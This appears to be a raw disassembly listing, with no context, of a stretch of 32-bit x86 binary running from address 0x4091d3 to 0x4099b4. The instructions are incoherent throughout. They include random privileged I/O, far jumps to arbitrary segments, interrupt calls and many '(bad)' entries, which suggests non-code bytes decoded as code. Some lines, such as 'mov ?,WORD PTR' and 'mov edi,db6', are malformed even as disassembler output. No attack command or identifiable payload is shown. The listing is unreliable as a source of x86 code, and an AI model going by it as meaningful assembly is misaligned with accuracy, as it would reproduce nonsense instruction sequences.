  4091d3:	pop    ecx
  4091d4:	mov    eax,0x12f8497a
  4091d9:	dec    edx
  4091da:	push   esp
  4091db:	mov    eax,ds:0xe07e8df4
  4091e0:	sub    BYTE PTR [ebx],bl
  4091e2:	mov    ebx,0x73268763
  4091e7:	std    
  4091e8:	mov    al,ds:0x4c42cac7
  4091ed:	in     eax,0x32
  4091ef:	inc    ecx
  4091f0:	inc    ebp
  4091f1:	repnz outs dx,DWORD PTR ds:[esi]
  4091f3:	lahf   
  4091f4:	fisttp WORD PTR [esi-0x1a]
  4091f7:	mov    ch,0xf5
  4091f9:	adc    BYTE PTR [ebx],0xb8
  4091fc:	clc    
  4091fd:	shl    DWORD PTR [esi-0x3f9d3d8],1
  409203:	sub    DWORD PTR [ecx*8-0x2df16362],esp
  40920a:	push   es
  40920b:	mul    ebp
  40920d:	repz or eax,0xb044e9b2
  409213:	lahf   
  409214:	aad    0x66
  409216:	jle    0x409207
  409218:	lahf   
  409219:	jmp    0x3509:0x5c5fd70e
  409220:	mov    ah,0x64
  409222:	mov    cl,0xc6
  409224:	in     al,0xb9
  409226:	push   0x4f
  409228:	shl    BYTE PTR [edi],1
  40922a:	cmp    al,0x80
  40922c:	jge    0x4091ba
  40922e:	mov    es,WORD PTR [ebx-0x1d]
  409231:	ds sub eax,0x8b68b6e3
  409237:	gs cdq 
  409239:	jbe    0x409281
  40923b:	in     al,dx
  40923c:	xor    al,0xe6
  40923e:	xchg   esi,eax
  40923f:	inc    edi
  409240:	jecxz  0x4091fa
  409242:	int    0x44
  409244:	push   ebp
  409245:	jle    0x40925d
  409247:	jo     0x4091f1
  409249:	rcr    BYTE PTR [ecx-0x27],1
  40924c:	mov    ecx,0x8709a2d5
  409251:	cli    
  409252:	fst    QWORD PTR [edx-0x73]
  409255:	adc    DWORD PTR [ecx-0x4071ec77],ebx
  40925b:	or     edx,DWORD PTR [eax+0x263838a1]
  409261:	ins    DWORD PTR es:[edi],dx
  409262:	int    0x3
  409264:	jb     0x40925c
  409266:	jp     0x409220
  409268:	(bad)  [edi]
  40926a:	xchg   DWORD PTR [eax+ebx*2],ebx
  40926d:	adc    BYTE PTR es:[eax+0x72c28095],dh
  409274:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409275:	push   ebx
  409276:	mov    BYTE PTR [edx+0x4f],bl
  409279:	push   0x4b
  40927b:	cld    
  40927c:	pop    es
  40927d:	cmc    
  40927e:	rol    esp,0x3a
  409281:	inc    edx
  409282:	jl     0x409301
  409284:	mov    cl,0x53
  409286:	pop    ecx
  409287:	sti    
  409288:	and    eax,0x5812c3a5
  40928d:	and    edi,eax
  40928f:	enter  0x582e,0xda
  409293:	push   ebx
  409294:	clc    
  409295:	je     0x409281
  409297:	sti    
  409298:	dec    ecx
  409299:	xor    esp,esi
  40929b:	or     eax,esi
  40929d:	out    0x2f,eax
  40929f:	push   eax
  4092a0:	repz imul ebp,DWORD PTR [ecx-0x60],0x53ed2a72
  4092a8:	popf   
  4092a9:	adc    BYTE PTR [esi+0x7e],ch
  4092ac:	out    0x53,al
  4092ae:	clc    
  4092af:	sub    edx,DWORD PTR [edx-0x5830002d]
  4092b5:	sbb    DWORD PTR [edi],ecx
  4092b7:	ret    0xb6d0
  4092ba:	push   ebp
  4092bb:	and    edx,DWORD PTR ds:0x648cc9bd
  4092c1:	xchg   edi,eax
  4092c2:	ja     0x4092c5
  4092c4:	in     al,0x9
  4092c6:	pop    ebx
  4092c7:	imul   ebx,ebx,0xffffffd8
  4092ca:	push   cs
  4092cb:	xchg   edx,eax
  4092cc:	repnz mov ecx,0x8afad74
  4092d2:	pusha  
  4092d3:	xchg   ecx,eax
  4092d4:	data16 mov ch,0xd8
  4092d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092d8:	fmul   DWORD PTR [esi+0x14875999]
  4092de:	int    0xba
  4092e0:	xabort 0xdb
  4092e3:	dec    esp
  4092e4:	add    eax,0x22e5ff63
  4092e9:	fst    DWORD PTR [esi-0x58]
  4092ec:	sub    BYTE PTR [ebx],ch
  4092ee:	jecxz  0x4092dc
  4092f0:	inc    esi
  4092f1:	or     bh,ah
  4092f3:	sub    ebp,DWORD PTR [esi-0x6]
  4092f6:	call   0xcd9f:0xbf778524
  4092fd:	mov    esp,0x10892655
  409302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409303:	es cld 
  409305:	sub    ebp,0x303b1825
  40930b:	sub    DWORD PTR [esi+0x738e43a2],esp
  409311:	aaa    
  409312:	into   
  409313:	mov    ecx,0x8d313030
  409318:	lds    edi,FWORD PTR [eax+0x192f645d]
  40931e:	push   ds
  40931f:	push   esi
  409320:	mov    bh,0xec
  409322:	sbb    al,0x36
  409324:	scas   al,BYTE PTR es:[edi]
  409325:	mov    esp,ss
  409327:	sub    al,0xc7
  409329:	or     eax,0x775fd408
  40932e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40932f:	fadd   DWORD PTR [ebx-0x3ada452e]
  409335:	or     DWORD PTR [ecx-0xd7bcbce],edx
  40933b:	sbb    al,0x7
  40933d:	mov    ebp,0x54cc4e12
  409342:	mov    ch,ch
  409344:	mov    ebp,0x339cdfbc
  409349:	xchg   ecx,eax
  40934a:	popa   
  40934b:	mov    dl,0xe0
  40934d:	jno    0x409344
  40934f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409350:	sbb    eax,0x51a10f5a
  409355:	jge    0x4092f0
  409357:	jge    0x409343
  409359:	stos   DWORD PTR es:[edi],eax
  40935a:	and    DWORD PTR [ebp-0x3c],0x44
  40935e:	push   esi
  40935f:	inc    ecx
  409360:	leave  
  409361:	pop    edx
  409362:	fldenv [ebx]
  409364:	cmp    al,0xcc
  409366:	aad    0xe0
  409368:	inc    esi
  409369:	jecxz  0x40936f
  40936b:	out    dx,eax
  40936c:	dec    edi
  40936d:	cmp    eax,0xbc27d233
  409372:	ror    BYTE PTR ds:0xbb47ef54,cl
  409378:	xor    esp,ebp
  40937a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40937b:	mov    al,0xc4
  40937d:	sbb    edi,DWORD PTR [esi]
  40937f:	popa   
  409380:	retf   
  409381:	mov    ch,BYTE PTR [esi]
  409383:	mov    edx,0xbb0a8a7c
  409388:	stos   BYTE PTR es:[edi],al
  409389:	fdivr  st(1),st
  40938b:	les    edx,FWORD PTR [ebp-0x16aafc5f]
  409391:	cmp    DWORD PTR [ebx+0x1ba941b2],edx
  409397:	lods   al,BYTE PTR ds:[esi]
  409398:	inc    eax
  409399:	sbb    eax,0xf1b996d0
  40939e:	fimul  WORD PTR [edi-0x24]
  4093a1:	mov    WORD PTR [edx+0x33],gs
  4093a4:	neg    ecx
  4093a6:	fnstenv [ecx+0x65]
  4093a9:	push   0xcd70047
  4093ae:	sbb    al,0x65
  4093b0:	cmp    DWORD PTR [esi+0x30],ebp
  4093b3:	pop    ds
  4093b4:	push   ebp
  4093b5:	jae    0x409341
  4093b7:	cmp    esp,DWORD PTR [ebx+0x2cd3296]
  4093bd:	add    ebx,ebp
  4093bf:	scas   eax,DWORD PTR es:[edi]
  4093c0:	fdivr  st(4),st
  4093c2:	gs inc edi
  4093c4:	(bad)
  4093c7:	mov    ebx,DWORD PTR [edx]
  4093c9:	jne    0x409357
  4093cb:	pop    eax
  4093cc:	inc    edx
  4093cd:	fnstcw WORD PTR [ecx+0x6c7b8215]
  4093d3:	adc    ah,BYTE PTR [edi-0x23]
  4093d6:	pop    ecx
  4093d7:	ds dec edx
  4093d9:	lea    eax,[ecx+0x3e]
  4093dc:	push   ds
  4093dd:	lods   al,BYTE PTR ds:[esi]
  4093de:	ins    BYTE PTR es:[edi],dx
  4093df:	ins    DWORD PTR es:[edi],dx
  4093e0:	mov    esp,0x2978b717
  4093e5:	jg     0x40942e
  4093e7:	sub    ebx,DWORD PTR ds:0xebb56035
  4093ed:	ficom  DWORD PTR [ecx+0x6e]
  4093f0:	inc    edx
  4093f1:	rcr    DWORD PTR [ecx],0x16
  4093f4:	repnz std 
  4093f6:	pop    ds
  4093f7:	sub    edi,DWORD PTR [ebx+0x2093a3f0]
  4093fd:	es call 0xb4f7fa23
  409403:	nop
  409404:	or     edi,DWORD PTR [ebp+0x37]
  409407:	inc    esi
  409408:	jl     0x4093d3
  40940a:	mov    esp,DWORD PTR [ecx]
  40940c:	cmc    
  40940d:	mov    ebp,0x6fb76106
  409412:	fs loopne 0x409490
  409415:	in     al,0xe6
  409417:	add    esi,DWORD PTR [edi-0x6a6a8a40]
  40941d:	into   
  40941e:	and    BYTE PTR [ebx],dl
  409420:	push   ebx
  409421:	data16 jmp 0x40947f
  409424:	mov    edi,0x5788e87c
  40942a:	ds jns 0x40945c
  40942d:	xor    al,0x62
  40942f:	shl    BYTE PTR [ebx-0x6868993e],1
  409435:	mov    eax,ds:0x184b6855
  40943a:	ss inc ebx
  40943c:	pop    edx
  40943d:	dec    eax
  40943e:	sahf   
  40943f:	push   es
  409440:	stos   DWORD PTR es:[edi],eax
  409441:	pop    ss
  409442:	(bad)  
  409443:	cmp    ebx,esi
  409445:	pop    edi
  409446:	cli    
  409447:	mov    esp,0xf72e64f3
  40944c:	int    0x52
  40944e:	sbb    BYTE PTR [ebp+0x20],bl
  409451:	mov    BYTE PTR [ebx+0x7],dl
  409454:	jns    0x4094cb
  409456:	jne    0x4094a6
  409458:	sub    bh,BYTE PTR [ecx-0x66]
  40945b:	cmc    
  40945c:	pop    esi
  40945d:	cmp    DWORD PTR [edx],ebx
  40945f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409460:	mov    al,0x17
  409462:	mov    WORD PTR [ebx],gs
  409464:	rcr    edi,0xb3
  409467:	adc    BYTE PTR [esi],ah
  409469:	jmp    0x8196f106
  40946e:	and    bl,BYTE PTR [esi]
  409470:	loop   0x409469
  409472:	in     al,0xe
  409474:	repz sbb ah,BYTE PTR [ebp+0x23a3dfb9]
  40947b:	gs pushf 
  40947d:	jmp    0x3aa1:0xd6f60168
  409484:	push   esp
  409485:	(bad)  [edx+0x29]
  409488:	aad    0x45
  40948a:	push   cs
  40948b:	or     al,0x7
  40948d:	pop    ss
  40948e:	enter  0xa546,0x74
  409492:	xor    ch,al
  409494:	shr    ch,cl
  409496:	xchg   esi,eax
  409497:	jecxz  0x40941f
  409499:	sbb    BYTE PTR [si],ah
  40949c:	jp     0x409476
  40949e:	je     0x40945c
  4094a0:	loope  0x40943e
  4094a2:	pusha  
  4094a3:	out    dx,al
  4094a4:	mov    eax,0x4a586ead
  4094a9:	push   esi
  4094aa:	lds    edx,FWORD PTR [ebx+0x4b]
  4094ad:	hlt    
  4094ae:	push   edi
  4094af:	xchg   edi,eax
  4094b0:	add    DWORD PTR ds:0x123c07ab,0xffffffcd
  4094b7:	ins    DWORD PTR es:[edi],dx
  4094b8:	enter  0x6a32,0x43
  4094bc:	mov    esp,ecx
  4094be:	enter  0x22cf,0x54
  4094c2:	mov    eax,0xd24b2d96
  4094c7:	push   esi
  4094c8:	mov    bl,0x7c
  4094ca:	rol    BYTE PTR ds:0xd0a07b30,0x6f
  4094d1:	cmp    ch,bh
  4094d3:	mov    ds:0xeb1dd17e,eax
  4094d8:	(bad)  
  4094d9:	addr16 xor al,0x56
  4094dc:	xchg   BYTE PTR [eax+0x7e036969],bh
  4094e2:	adc    ah,BYTE PTR [ebx+0x42]
  4094e5:	inc    eax
  4094e6:	sub    al,0x5d
  4094e8:	cmc    
  4094e9:	mov    ds:0x41a9bef4,eax
  4094ee:	adc    eax,0x24cbc9c0
  4094f3:	dec    ebp
  4094f4:	lahf   
  4094f5:	in     eax,0x94
  4094f7:	add    esi,ecx
  4094f9:	mov    edi,0x7c4ed47a
  4094fe:	scas   al,BYTE PTR es:[edi]
  4094ff:	xor    edx,DWORD PTR [edx+ebp*1-0x1f]
  409503:	push   edx
  409504:	aad    0x99
  409506:	fbstp  TBYTE PTR [eax]
  409508:	out    dx,al
  409509:	das    
  40950a:	cli    
  40950b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40950c:	xor    ah,BYTE PTR [ebp-0x7702f20f]
  409512:	sub    al,0xde
  409514:	arpl   WORD PTR [ecx-0x5a549817],bx
  40951a:	jl     0x40949e
  40951c:	clc    
  40951d:	enter  0xf744,0x4d
  409521:	test   eax,0x98a1a093
  409526:	mov    DWORD PTR [eax+0x1bb9c9d2],edx
  40952c:	addr16 xchg ebx,eax
  40952e:	or     DWORD PTR [edi],esi
  409530:	push   edi
  409531:	ret    
  409532:	jnp    0x4094cf
  409534:	call   0xe2998506
  409539:	push   ebx
  40953a:	(bad)  
  40953b:	sar    dl,1
  40953d:	mov    edi,0x3c570436
  409542:	inc    esp
  409543:	cmp    BYTE PTR [ecx-0x1f],0x97
  409547:	push   es
  409548:	int3   
  409549:	pop    edi
  40954a:	jnp    0x409553
  40954c:	adc    esp,esi
  40954e:	repnz mov eax,ds:0x3bd6377
  409554:	fdivr  QWORD PTR [edi]
  409556:	pop    ebp
  409557:	dec    ebp
  409558:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409559:	jecxz  0x409597
  40955b:	mov    al,0xf3
  40955d:	add    ecx,DWORD PTR [edx-0x3]
  409560:	add    dl,BYTE PTR [edx+0x332f6867]
  409566:	test   DWORD PTR [eax-0x37c405fd],ebp
  40956c:	xor    BYTE PTR [edi],bl
  40956e:	jmp    0x409534
  409570:	xorps  xmm2,XMMWORD PTR [ebp+ecx*8-0x5c5080dd]
  409578:	push   es
  409579:	hlt    
  40957a:	pop    ds
  40957b:	inc    eax
  40957c:	mov    al,ds:0x19b3cd47
  409581:	repnz repnz sbb ah,0x3
  409586:	test   DWORD PTR [esi],esi
  409588:	sbb    ebx,0xc24537ea
  40958e:	adc    al,0x42
  409590:	in     eax,0x3
  409592:	add    BYTE PTR [edx+0x4b3e1d2],cl
  409598:	dec    ebp
  409599:	pusha  
  40959a:	jae    0x40956d
  40959c:	call   0x1079:0x720d43aa
  4095a3:	les    ecx,FWORD PTR [edi]
  4095a5:	int    0x50
  4095a7:	je     0x4095fb
  4095a9:	sar    BYTE PTR [eax],0xcd
  4095ac:	cld    
  4095ad:	pop    esp
  4095ae:	dec    eax
  4095af:	fcmovb st,st(2)
  4095b1:	imul   ebp,edi,0xadc46088
  4095b7:	adc    dh,BYTE PTR [ecx]
  4095b9:	into   
  4095ba:	mov    al,0x2e
  4095bc:	out    dx,eax
  4095bd:	dec    eax
  4095be:	(bad)  
  4095bf:	mov    bh,0x7e
  4095c1:	scas   eax,DWORD PTR es:[edi]
  4095c2:	repz inc ecx
  4095c4:	mov    ebx,0xa8ae4503
  4095c9:	mov    esp,DWORD PTR [ebx]
  4095cb:	les    ecx,FWORD PTR [esi+0x3eb8aec0]
  4095d1:	icebp  
  4095d2:	sahf   
  4095d3:	sbb    esi,DWORD PTR [ecx-0x772e8311]
  4095d9:	mov    dh,0xed
  4095db:	fld    DWORD PTR [edx+0x40]
  4095de:	(bad)  
  4095df:	mul    eax
  4095e1:	pop    esp
  4095e2:	in     al,dx
  4095e3:	leave  
  4095e4:	test   BYTE PTR [ebx+0x1d],cl
  4095e7:	pop    ds
  4095e8:	cmp    BYTE PTR [eax-0x774531a2],cl
  4095ee:	and    cl,dh
  4095f0:	jb     0x4095ab
  4095f2:	mov    ebp,0x885ca856
  4095f7:	fcomi  st,st(5)
  4095f9:	rcr    al,cl
  4095fb:	ds mov ecx,ds
  4095fe:	mov    ch,0x36
  409600:	lahf   
  409601:	popf   
  409602:	add    edx,DWORD PTR [esi-0x35618a68]
  409608:	and    BYTE PTR [ebx],bl
  40960a:	fnsave [esi-0x30]
  40960d:	adc    al,0xd5
  40960f:	in     al,dx
  409610:	sub    eax,DWORD PTR [edx-0x2]
  409613:	xchg   esp,eax
  409614:	jg     0x4095e0
  409616:	xor    eax,DWORD PTR [bp+si+0x2a57]
  40961b:	aas    
  40961c:	and    dh,al
  40961e:	nop
  40961f:	cmp    eax,0xaa3e1d96
  409624:	and    BYTE PTR ds:0x1c7c7ef8,al
  40962a:	cmp    BYTE PTR [edi-0x5694a98a],ah
  409630:	lods   eax,DWORD PTR ds:[esi]
  409631:	sbb    cl,BYTE PTR [esi]
  409633:	xchg   DWORD PTR ds:0xa5f96eb9,eax
  409639:	sub    DWORD PTR [ecx],0x5739f802
  40963f:	dec    edi
  409640:	sbb    esp,DWORD PTR [esi-0x527578b4]
  409646:	in     eax,dx
  409647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409648:	scas   eax,DWORD PTR es:[edi]
  409649:	retf   
  40964a:	sbb    al,BYTE PTR [ebp+0x21]
  40964d:	out    dx,eax
  40964e:	es inc edi
  409650:	jge    0x4095f6
  409652:	lds    ecx,FWORD PTR [eax]
  409654:	mov    ?,WORD PTR [ebp-0x7e]
  409657:	sub    dh,BYTE PTR [eax+0x3a94fed]
  40965d:	stos   DWORD PTR es:[edi],eax
  40965e:	sbb    ebp,DWORD PTR [ebp+0x4c]
  409661:	cmp    eax,0x675cfd4d
  409666:	rcl    BYTE PTR [ecx+edx*2-0x7084423f],cl
  40966d:	pop    ss
  40966e:	dec    BYTE PTR [edx+0x416d0239]
  409674:	mov    esi,0xa90e086
  409679:	clc    
  40967a:	sbb    DWORD PTR [esi-0x4e],eax
  40967d:	inc    ebp
  40967e:	mov    bl,0xc2
  409680:	jmp    0x409670
  409682:	sub    BYTE PTR [esi-0x73c13dab],ch
  409688:	ds sbb ch,cl
  40968b:	in     al,dx
  40968c:	int3   
  40968d:	sub    BYTE PTR ds:0x5c651ea9,0x4f
  409694:	jmp    0x5eac:0x9d43e5eb
  40969b:	jne    0x409641
  40969d:	mov    eax,0xc982aae0
  4096a2:	add    bh,BYTE PTR [edx-0x5dcc0ca4]
  4096a8:	pop    es
  4096a9:	mov    ebp,eax
  4096ab:	fist   WORD PTR [ecx]
  4096ad:	fstp   QWORD PTR [ebx-0xc]
  4096b0:	pop    ss
  4096b1:	dec    esi
  4096b2:	or     al,0xc5
  4096b4:	in     eax,dx
  4096b5:	cmp    esp,DWORD PTR [esi]
  4096b7:	jecxz  0x40972d
  4096b9:	push   cs
  4096ba:	inc    esp
  4096bb:	scas   eax,DWORD PTR es:[edi]
  4096bc:	cli    
  4096bd:	mov    al,BYTE PTR [esi]
  4096bf:	inc    edx
  4096c0:	jmp    0xe4d96897
  4096c5:	mov    dl,cl
  4096c7:	loop   0x40965f
  4096c9:	lea    ebx,[ebx+0x4576321f]
  4096cf:	or     eax,0xe88c3581
  4096d4:	ret    
  4096d5:	fs inc esi
  4096d7:	mov    esp,0xb52854f9
  4096dc:	and    BYTE PTR [esi+0xb],bh
  4096df:	pushf  
  4096e0:	rcr    DWORD PTR [ebx-0x17],cl
  4096e3:	daa    
  4096e4:	(bad)  
  4096e5:	push   esp
  4096e6:	sub    BYTE PTR [ebx+0x386f7185],dh
  4096ec:	into   
  4096ed:	jp     0x40973a
  4096ef:	sub    DWORD PTR [edi-0x4b],esp
  4096f2:	xor    eax,0xe8112fa9
  4096f7:	push   esp
  4096f8:	fcom   QWORD PTR [ebp+ebp*8+0x0]
  4096fc:	hlt    
  4096fd:	add    DWORD PTR [edx],0x913731b7
  409703:	and    edi,DWORD PTR [eax-0x1c]
  409706:	ja     0x4096f5
  409708:	jmp    0x19ab:0x75a689d4
  40970f:	mov    ds:0xd037ce73,al
  409714:	retf   0x8fbe
  409717:	ret    
  409718:	add    BYTE PTR [esi],al
  40971a:	dec    ecx
  40971b:	lock ficomp DWORD PTR [ebp-0x67a1e57e]
  409722:	xchg   ebx,eax
  409723:	(bad)  
  409724:	and    DWORD PTR [edx],eax
  409726:	cmp    edi,DWORD PTR [ebx-0xb111ed4]
  40972c:	add    BYTE PTR [edi+ecx*1+0x11bfec92],ah
  409733:	sbb    DWORD PTR [eax],eax
  409735:	jg     0x409707
  409737:	or     DWORD PTR [esi-0x2c],edx
  40973a:	je     0x40975d
  40973c:	or     al,0x74
  40973e:	add    edi,DWORD PTR [eax-0x7a]
  409741:	pushf  
  409742:	lock jecxz 0x409795
  409745:	or     esi,DWORD PTR [ecx+edi*2]
  409748:	je     0x40976e
  40974a:	jle    0x409768
  40974c:	dec    esp
  40974d:	dec    edx
  40974e:	xchg   BYTE PTR [esi-0x4ec28504],bh
  409754:	in     eax,dx
  409755:	push   ds
  409756:	pop    ebp
  409757:	push   edi
  409758:	loope  0x40976c
  40975a:	aas    
  40975b:	push   ebp
  40975c:	mov    dl,bl
  40975e:	cli    
  40975f:	rcl    edi,1
  409761:	cmp    ch,ah
  409763:	cld    
  409764:	daa    
  409765:	pop    ds
  409766:	stos   DWORD PTR es:[edi],eax
  409767:	test   al,0x0
  409769:	add    DWORD PTR [bx+si+0x2156],ebp
  40976e:	xchg   esp,eax
  40976f:	in     eax,0xc3
  409771:	rcl    DWORD PTR [ecx-0x41],cl
  409774:	mov    ds:0x30e88ddf,al
  409779:	sbb    al,0x10
  40977b:	aaa    
  40977c:	pop    edx
  40977d:	mov    edi,fs
  40977f:	mov    BYTE PTR [eax+0x37fc3cb4],ch
  409785:	arpl   si,bx
  409787:	xchg   ecx,eax
  409788:	pop    ebp
  409789:	jo     0x40976d
  40978b:	adc    al,0x39
  40978d:	pop    ebx
  40978e:	adc    eax,0x3b047ac2
  409793:	test   ebx,esp
  409795:	push   ebx
  409796:	outs   dx,DWORD PTR ds:[esi]
  409797:	rcr    DWORD PTR [edx+0x4b],cl
  40979a:	popf   
  40979b:	sub    al,BYTE PTR [eax]
  40979d:	int    0xba
  40979f:	push   0xd25b17af
  4097a4:	outs   dx,BYTE PTR ds:[esi]
  4097a5:	ss adc al,0x5a
  4097a8:	pop    es
  4097a9:	lods   al,BYTE PTR ds:[esi]
  4097aa:	(bad)  
  4097ac:	mov    ebx,0x9ff958f2
  4097b1:	mov    ecx,0xd1b85cf
  4097b6:	loop   0x40977c
  4097b8:	int    0xa0
  4097ba:	rol    esi,cl
  4097bc:	dec    ebx
  4097bd:	xchg   esi,eax
  4097be:	neg    edi
  4097c0:	jno    0x40978d
  4097c2:	xchg   edi,eax
  4097c3:	xor    BYTE PTR [eax],cl
  4097c5:	fld    QWORD PTR [edi+edx*2+0x5810e7b6]
  4097cc:	or     BYTE PTR [edi+0x2e],0x8f
  4097d0:	stos   DWORD PTR es:[edi],eax
  4097d1:	mov    ebx,0x359ffcb9
  4097d6:	cld    
  4097d7:	adc    BYTE PTR [ebp-0x71],ch
  4097da:	xchg   BYTE PTR [ecx+0x6975cc2e],ch
  4097e0:	sub    BYTE PTR [ebx],ch
  4097e2:	xchg   ebp,eax
  4097e3:	je     0x4097d9
  4097e5:	fcom   DWORD PTR [ecx+0x5e]
  4097e8:	sub    dh,BYTE PTR [edx]
  4097ea:	xlat   BYTE PTR ds:[ebx]
  4097eb:	clc    
  4097ec:	mov    cl,0x6c
  4097ee:	(bad)  
  4097ef:	out    0xcf,eax
  4097f1:	pop    ds
  4097f2:	gs mov esp,0x8dbcfa39
  4097f8:	mov    edi,db6
  4097fb:	mov    al,0x16
  4097fd:	aam    0x91
  4097ff:	mov    esi,0x10727191
  409804:	cmp    eax,0x51e2a8d2
  409809:	xchg   edx,eax
  40980a:	or     DWORD PTR [eax],ebp
  40980c:	int    0x22
  40980e:	test   DWORD PTR [esi],edi
  409810:	push   ecx
  409811:	popa   
  409812:	ins    BYTE PTR es:[edi],dx
  409813:	ds jge 0x409819
  409816:	inc    esp
  409817:	push   esi
  409818:	test   eax,0x74e276e6
  40981d:	sub    edx,DWORD PTR [ebx-0xc989f2b]
  409823:	jbe    0x40987d
  409825:	cmp    esp,DWORD PTR [esi]
  409827:	in     eax,0x50
  409829:	mov    DWORD PTR [eax],ecx
  40982b:	xor    bh,0x39
  40982e:	xchg   ebx,eax
  40982f:	test   BYTE PTR [eax],ch
  409831:	adc    eax,0xa8469c5f
  409836:	xor    DWORD PTR [edx+0x32d02d99],ecx
  40983c:	push   0xffffffae
  40983e:	das    
  40983f:	pop    ebp
  409840:	sub    eax,0x27ac8d3d
  409845:	mov    al,ds:0x15d6c60d
  40984a:	sub    edx,DWORD PTR [ebx]
  40984c:	and    dh,al
  40984e:	rol    cl,cl
  409850:	pop    ecx
  409851:	addr16 push cs
  409853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409854:	icebp  
  409855:	dec    ebx
  409856:	add    al,0x62
  409858:	lea    ebx,[edx+0xd]
  40985b:	test   BYTE PTR [edi-0x58ad31f2],0xd9
  409862:	adc    DWORD PTR [ecx-0x11],esp
  409865:	jbe    0x4098c1
  409867:	pop    edx
  409868:	lea    ebx,[ecx]
  40986a:	fsub   st,st(3)
  40986c:	sub    al,bl
  40986e:	outs   dx,BYTE PTR ds:[esi]
  40986f:	daa    
  409870:	leave  
  409871:	mov    bh,0xe5
  409873:	mov    edi,0x849f738d
  409878:	sbb    edx,DWORD PTR [ebp+0x65012514]
  40987e:	adc    eax,0x4763104f
  409883:	outs   dx,DWORD PTR ds:[esi]
  409884:	test   eax,0x9f91faee
  409889:	mov    bl,0x72
  40988b:	jno    0x409866
  40988d:	mov    al,0xc
  40988f:	or     al,0x8c
  409891:	into   
  409892:	push   0xe85fb452
  409897:	xchg   edx,eax
  409898:	mov    dh,0x97
  40989a:	aaa    
  40989b:	mov    ch,0x8
  40989d:	jns    0x4098b5
  40989f:	add    BYTE PTR [esi+0x2b],al
  4098a2:	pop    ecx
  4098a3:	cs icebp 
  4098a5:	dec    ecx
  4098a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098a7:	lahf   
  4098a8:	cwde   
  4098a9:	dec    edx
  4098aa:	std    
  4098ab:	js     0x4098b9
  4098ad:	loope  0x40990d
  4098af:	out    0x50,eax
  4098b1:	or     bl,ah
  4098b3:	or     BYTE PTR [ebp-0x59],ch
  4098b6:	(bad)  
  4098b7:	(bad)  
  4098b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098b9:	mov    ah,BYTE PTR [esi]
  4098bb:	xchg   edx,eax
  4098bc:	xor    eax,0xa759bbd1
  4098c1:	in     al,0x2b
  4098c3:	and    al,0x3e
  4098c5:	shl    DWORD PTR [ebx+0x7566db6f],cl
  4098cb:	lahf   
  4098cc:	inc    esp
  4098cd:	stc    
  4098ce:	lods   eax,DWORD PTR ds:[esi]
  4098cf:	daa    
  4098d0:	add    eax,DWORD PTR [ecx+0xb]
  4098d3:	xchg   edx,eax
  4098d4:	pop    esi
  4098d5:	or     BYTE PTR [eax+0x5719a9c4],cl
  4098db:	lods   al,BYTE PTR ds:[esi]
  4098dc:	sub    BYTE PTR ss:[ebp-0x7],al
  4098e0:	fsubr  QWORD PTR cs:[eax+0xf4f6bcb]
  4098e7:	cld    
  4098e8:	mov    bl,BYTE PTR [ebp-0x69f1fefe]
  4098ee:	jmp    0x2697:0xbd9cb535
  4098f5:	iret   
  4098f6:	call   0x54a35542
  4098fb:	xor    BYTE PTR [eax+edi*4-0x652cfb8a],bh
  409902:	fst    DWORD PTR [esi+edx*4]
  409905:	dec    esp
  409906:	and    eax,esi
  409908:	add    ebx,esp
  40990a:	ret    
  40990b:	ds push ds
  40990d:	(bad)  
  40990e:	in     al,0xdc
  409910:	dec    esi
  409911:	cdq    
  409912:	jge    0x4098cb
  409914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409915:	cmp    dl,BYTE PTR [eax]
  409917:	inc    esi
  409918:	mov    ch,0xe6
  40991a:	jl     0x40995c
  40991c:	(bad)  
  40991d:	cmp    DWORD PTR [ebx+0x3b748c14],edx
  409923:	das    
  409924:	retf   0x7c6c
  409927:	test   eax,0xd7010e01
  40992c:	std    
  40992d:	push   es
  40992e:	outs   dx,BYTE PTR ds:[esi]
  40992f:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  409931:	mov    eax,ds:0xba2f0bc9
  409936:	(bad)  
  409938:	sbb    DWORD PTR [esi+0x6c80d3ef],0x4f
  40993f:	ins    DWORD PTR es:[edi],dx
  409940:	ss jbe 0x409926
  409943:	pushf  
  409944:	loop   0x4098de
  409946:	sub    eax,0x88dc2bbb
  40994b:	jno    0x4099b2
  40994d:	mov    esi,0xa6c242ac
  409952:	cld    
  409953:	jge    0x409916
  409955:	out    0x7c,al
  409957:	data16 repz jo 0x409988
  40995b:	jnp    0x40998c
  40995d:	adc    DWORD PTR [ebp-0x2c],ecx
  409960:	lock and al,0xbb
  409963:	push   esp
  409964:	je     0x409919
  409966:	aad    0x7f
  409968:	xchg   ebx,eax
  409969:	sbb    eax,0x52f5b5dd
  40996e:	scas   eax,DWORD PTR es:[edi]
  40996f:	xchg   esp,eax
  409970:	addr16 or al,0x69
  409973:	dec    esi
  409974:	or     eax,0xfde779ee
  409979:	lock jg 0x409919
  40997c:	cli    
  40997d:	dec    eax
  40997e:	mov    edx,0x287bf3ee
  409983:	repnz (bad) 
  409985:	jo     0x4099bc
  409987:	imul   edx,DWORD PTR [eax-0x17c60085],0xfffffff6
  40998e:	loop   0x409923
  409990:	ret    0xf424
  409993:	shl    ch,cl
  409995:	in     al,0xc6
  409997:	inc    esi
  409998:	in     al,dx
  409999:	in     al,0xd3
  40999b:	jge    0x4099bb
  40999d:	jo     0x4099a7
  40999f:	xor    edi,DWORD PTR [esi-0x477f9df3]
  4099a5:	sub    ebx,esi
  4099a7:	(bad)  
  4099a8:	(bad)  
  4099a9:	cs sub al,0xfa
  4099ac:	mov    al,0x35
  4099ae:	inc    edx
  4099af:	xchg   esi,eax
  4099b0:	je     0x409982
  4099b2:	xchg   ecx,eax
  4099b3:	std    
  4099b4:	mov    edi,0x5dd93ee9
